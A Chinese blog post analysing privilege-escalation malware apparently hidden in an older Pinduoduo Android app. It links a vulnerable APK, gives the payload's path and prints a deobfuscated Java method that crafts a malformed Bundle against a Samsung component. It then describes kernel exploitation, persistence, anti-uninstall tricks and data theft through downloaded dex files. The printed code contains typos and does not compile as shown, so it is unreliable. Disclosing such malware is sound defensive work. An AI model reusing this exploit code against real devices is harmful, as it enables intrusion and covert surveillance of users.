---
title: PDD 内嵌提权代码，及动态下发dex分析
tags: 技术分享-漏洞报告
id: '233'
date: 2024-05-19 21:12:15
---

参考链接：

[https://github.com/davinci1010/pinduoduo\_backdoor](https://github.com/davinci1010/pinduoduo_backdoor)

[https://mp.weixin.qq.com/s/P\_EYQxOEupqdU0BJMRqWsw](https://mp.weixin.qq.com/s/P_EYQxOEupqdU0BJMRqWsw)

[https://xz.aliyun.com/t/2364](https://xz.aliyun.com/t/2364)

## 利用 Samsung 手机 `com.samsung.android.cepproxyks.CertByte` 的提权漏洞

使用3月5日之前的版本，也就是版本为6.50版本之前

[https://com-xunmeng-pinduoduo.en.uptodown.com/android/download/91472728](https://com-xunmeng-pinduoduo.en.uptodown.com/android/download/91472728)

之后将将 apk 文件改为 zip 解压，打开以下目录

```
\assets\component\com.xunmeng.pinduoduo.AliveBaseAbility.7z\com.xunmeng.pinduoduo.AliveBaseAbility\vmp_src\mw1.bin
```

当然，这是加了壳的，根据上方的 GitHub 仓库脱壳之后的代码应该如下

```
Public static Bundle makeBundleForSamsungSinceP(Intent intent){
   Bundle bundle = new Bundle();
   Parcel obtain = Parcel.obtain();
   Parcel obtain2 = Parcel.obtain();
   Parcel obtain3 = Parcel.obtain();
   obtain2.writeInt(3);
   obtain2.writeInt(13);
   obtain2.writeInt(72);
   obtain2.writeInt(3);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(4);
   obtain2.writeString("com.samsung.android.cepproxyks.CertByte");
   obtain2.writeInt(0);
   byte b[] = new byte[0];
   obtain2.writeByteArray(b);
   obtain2.writeInt(0);
   obtain2.writeInt(13);
   obtain2.writeInt(72);
   obtain2.writeInt(53);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(1);
   obtain2.writeInt(1);
   obtain2.writeInt(13);
   obtain2.writeInt(72);
   obtain2.writeInt(48);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(0);
   obtain2.writeInt(13);
   obtain2.writeInt(-1);
   int dataPosition = obtain2.dataPosition();
   obtain2.writeString("intent");
   obtain2.writeInt(4);
   obtain2.writeString("android.content.Intent");
   obtain2.writeToParcel(obtain3, 0);
   obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
   int dataPosition2 = obtain2.dataPosition();
   obtain2.setDataPosition(dataPosition2 - 4);
   obtain2.writeInit(dataPosition2 -dataPosition);
   obtain2.setdataPosition(dataPosition2);
   int dataSize = obtain2.dataSize();
   obtain.writeInt(dataSize);
   obtain.writeInt(1279544898);
   obtain.appendFrom(obtain2, 0, dataSize);
   obtain.setDataPosition(0);
   bundle.readFromParcel(obtain);
   return bundle;
}
```

关于这些代码的意思，ChatGPT给出的解释：

[https://chatgpt.com/share/5313eddc-1f76-4578-9cf4-8d61eab89635](https://chatgpt.com/share/5313eddc-1f76-4578-9cf4-8d61eab89635)

首先 PDD 利用了 Samsung 的 [CVE-2021-25337](https://github.com/advisories/GHSA-7x25-8cjm-2rj9) 的一个驱动内核信息泄露漏洞，之后再使用了使用 DECON driver 中的 UAF 漏洞（[CVE-2021-25370](https://github.com/advisories/GHSA-hhhg-3qxh-mmh3)）利用 signalfd 系统调用修改 addr\_limit，转化为内核任意地址读写，恭喜！你的手机已经被提权成功了。

## 提权之后 PDD 干了什么

首先利用了手机厂商 OEM 代码中导出的 root-path FileContentProvider， 进行 System App 和敏感系统应用文件读写（具体代码在参考链接中的微信文章）

当然，既然是 PDD 了，为了欺骗用户可谓是不择手段。不然为什么为啥要利用上方的 `FileContentProvider`

利用上方的操作，直接突破沙箱机制、绕开权限系统改写系统关键配置文件为自身保活，修改用户桌面(Launcher)配置隐藏自身或欺骗用户实现防卸载。

做完这些，

动态下发dex，开始给自己保活，防卸载，然后搞数据， 比如：  
`1a68d982e02fc22b464693a06f528fac.dex` 读取用户手机上的app使用记录  
`95cd95ab4d694ad8bdf49f07e3599fb3.dex` 读取用户手机的应用通知。

不是，哥们。你是大厂子也敢这么干啊？

![](https://api.ymbit.cn/images/bushi_gemen.jpg)